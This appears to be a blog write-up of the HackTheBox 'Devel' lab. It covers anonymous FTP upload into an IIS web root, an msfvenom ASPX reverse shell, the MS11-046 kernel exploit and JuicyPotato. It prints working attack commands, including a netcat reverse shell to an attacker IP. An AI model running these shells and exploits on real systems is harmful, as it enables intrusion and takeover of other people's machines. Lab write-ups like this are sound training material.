---
toc: true
comments: true
title: HackTheBox - Devel
layout: post
title: HackTheBox - Devel
date: 2024-06-02 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Windows, IIS, FTP, File Upload, ASPX, Kernel Exploit, JuicyPotato, PrivEsc]    
image: /assets/Posts/Devel/logo.png
---

## Pre
- After the "single old bug = instant SYSTEM" combo of [Lame](/posts/hackthebox-lame/) and [Legacy](/posts/hackthebox-legacy/), Devel is the first HTB box that actually splits into two clear stages: get a foothold, then escalate. That makes it a great teaching box.
- The foothold is a lovely little logic flaw – anonymous FTP that happens to write straight into the web root – and the privesc is our first proper Windows kernel exploit.
- If you did the file-upload bypass on my [RootMe writeup](/posts/tryhackme-rootme/), the "upload a shell, then call it over HTTP" idea will feel familiar; we're just doing the Windows/ASPX flavour this time.

## Phase 1: Recon
Two-stage nmap as always:

```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
80/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 21,80 -T4 -sSCV -A -oN nmap/versions $IP

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```

Two ports, and the interesting line is `ftp-anon: Anonymous FTP login allowed`. IIS 7.5 on the web side means the server almost certainly runs `.aspx`. Let's see what the FTP server actually exposes.

```shell
$ ftp $IP
Name: anonymous
Password:
230 User logged in.
ftp> dir
02-18-17  02:35PM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

That listing is the giveaway: `iisstart.htm` and `welcome.png` are the **default IIS web-root files**. In other words, the anonymous FTP root *is* the web root. Anything we upload here we can then request through the browser – and IIS will happily execute an `.aspx` file for us. That's our RCE.

## Phase 2: Foothold via ASPX upload
Since IIS runs ASP.NET, we generate an `.aspx` reverse shell. `msfvenom` is just the payload factory here:

```shell
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx -o shell.aspx
```

Upload it through FTP. **Critical detail:** switch FTP to binary mode first (`binary`), otherwise the file gets mangled by ASCII line-ending translation and IIS throws a compilation error – a classic beginner trap.

```shell
ftp> binary
200 Type set to I.
ftp> put shell.aspx
226 Transfer complete.
```

Start a handler and then simply *browse* to the file we just uploaded:

```shell
$ msfconsole -qx 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; run'

$ curl http://10.10.10.5/shell.aspx
```

The moment IIS renders the page, our payload fires:

```shell
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

We're in as the low-privileged application-pool identity. Now the real work: escalation.

> If you prefer a fully manual foothold, upload a small `.aspx` command webshell instead of a meterpreter payload and pass commands via a query string, exactly like the `.php5` shell on RootMe. Same idea, different runtime.
{: .prompt-tip }

## Phase 3: Privilege Escalation
First, fingerprint the box. `systeminfo` is the single most useful command on a Windows privesc:

```shell
meterpreter > shell
C:\> systeminfo
OS Name:            Microsoft Windows 7 Enterprise
OS Version:         6.1.7600 N/A Build 7600
System Type:        X86-based PC
Hotfix(s):          N/A
```

Two enormous red flags: **Windows 7 build 7600 (no service pack), x86, and zero hotfixes installed.** This machine has never been patched. That points us straight at a kernel exploit.

We feed the `systeminfo` output to a suggester to confirm the best candidate:

```shell
$ python2 windows-exploit-suggester.py --database *.xls --systeminfo systeminfo.txt
[E] MS11-046: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege
```

**MS11-046** (CVE-2011-1249) – the `afd.sys` local privilege escalation – is the canonical Devel exploit. We grab a precompiled x86 binary (or compile ExploitDB 40564 ourselves), upload it, and run it:

```shell
meterpreter > upload MS11-046.exe
C:\> .\MS11-046.exe
C:\> whoami
nt authority\system
```

And we're SYSTEM. 🎉

### Alternative: SeImpersonate → JuicyPotato
Because we landed as an IIS application-pool identity, `whoami /priv` reveals **`SeImpersonatePrivilege`** enabled. That's the ticket for a *Potato* attack (JuicyPotato / RoguePotato), which abuses token impersonation to run a command as SYSTEM without touching the kernel:

```shell
C:\> whoami /priv | findstr Impersonate
SeImpersonatePrivilege        Enabled

C:\> JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c nc.exe 10.10.14.7 4445 -e cmd.exe" -t *
```

Both paths are worth practising: kernel exploits are noisy and can BSOD the box, whereas Potato attacks are cleaner and are the technique you'll actually reach for on modern Windows service accounts.

## Conclusions
- Devel is the first HTB box that teaches the foothold → privesc rhythm properly. The foothold is pure misconfiguration (anonymous FTP writing into the web root), not a CVE.
- Remember `binary` mode when uploading executables/shells over FTP – it's the silent killer of many first attempts.
- We covered *two* escalation philosophies: patch-level kernel exploits (MS11-046) and token-impersonation Potato attacks (SeImpersonate). Knowing when to use which is a core Windows skill.
- Up next on the Linux side is [Bashed](/posts/hackthebox-bashed/), where a friendly in-browser webshell leads to a cron-job escalation.

_Keep hacking_  🙈🙉🙊
